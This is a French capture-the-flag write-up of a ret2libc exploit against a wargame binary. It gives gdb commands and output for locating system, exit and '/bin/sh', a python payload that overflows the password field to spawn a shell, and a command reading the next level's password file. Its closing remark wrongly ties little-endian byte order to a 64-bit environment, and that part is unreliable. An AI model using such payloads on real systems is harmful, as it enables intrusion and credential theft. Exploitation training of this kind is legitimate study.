Ayant trouve un nom d'utilisateur "dat_wil" et un mot de passe "admin", on tente de les rentrer.
Le mot de passe ne semble pas fonctionner. La fonction ne disposant pas d'un appel system, nous allons devoir faire appel à une attaque ret2libc.

On trouve si on peut faire crasher le programme avec une trop grosse chaine de caractere pour le nom d'utilisateur et le mot de passe.
En effectuant de nombreux tests manuels, on se rend compte que le mot de passe entraine un segfault si jamais on tape 80+ caracteres.
On a donc l'offset pour envoyer un payload.

Pour que ce payload soit utile, on va devoir acceder à certaines informations.
On demarre donc le programme avec "r" dans gdb.

On fait crash le programme lors de la saisie du mot de passe.

Suite au crash, on tape la commande
```info proc map```

On a alors le tableau suivante:
```process 1888
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fd8000 0xf7fdb000     0x3000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

Pour chaque ligne, on tape la commande du debut a la fin de l'addresse, pour retrouver la string "/bin/sh": (0xf7f897ec)
```(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
```


On cherche l'adresse de la fonction system avec la commande: (0xf7e6aed0)
```
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

On cherche l'adresse de la fonction exit avec la commande: (0xf7e5eb70)
```
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit
```

Le payload sera constitué de la manière suivante: offset ('*' * 80) + "system" + "exit" + "/bin/sh"
```python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload```

```cat /tmp/payload - | ./level01```

```cat /home/users/level02/.pass```


Explications supplementaires:

Il est à noté que l'appel à exit est optionnel, en effet, ligne suivante fonctionne egalement:

```python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload```

Exit permet juste de quitter le programme proprement. Il est par contre imperatif de disposer d'une adresse en l'appel à system et à son argument /bin/sh.
En effet, l'assembleur a besoin de disposer d'une adresse de sortie après l'appel d'une fonction, avant de recevoir les arguments.

Ne pas indiquer d'une adresse entre system et /bin/sh fera qu'il n'y aura pas d'arguments et que /bin/sh sera la fonction de sortie, ce qui posera problème.

Enfin, vis à vis de l'ordre inversé des chiffres des adresses, cela est dû à l'architecture 64 bits de notre environnement, qui nous fait passer au format de lecture little endian.

Source: https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc